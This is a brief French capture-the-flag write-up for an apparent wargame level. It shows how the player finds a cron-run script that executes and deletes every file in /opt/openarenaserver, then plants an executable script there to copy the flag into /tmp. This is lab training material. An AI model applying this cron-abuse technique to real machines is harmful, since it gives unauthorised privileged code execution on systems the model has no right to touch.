#on ne trouve rien dans la ~ du niveau, on cherche donc ailleurs

find / -user flag05 2> /dev/null

#on trouve deux fichiers

/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

#qui contiennent ce code

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

#tous les fichiers du /opt/openarenaserver/* sont executes puis supprimes par un cron les uns apres les autres, le flag doit se trouver quelque part par la
#on cree donc un script pour recuperer le flag et le deplacer qui sera execute par ledit cron
#le script d'exploit est en ressource

chmod +x /opt/openarenaserver/exploit
cat /tmp/flag05

#bien sur il faut attendre un peu que le cron fasse son office pour recuperer le flag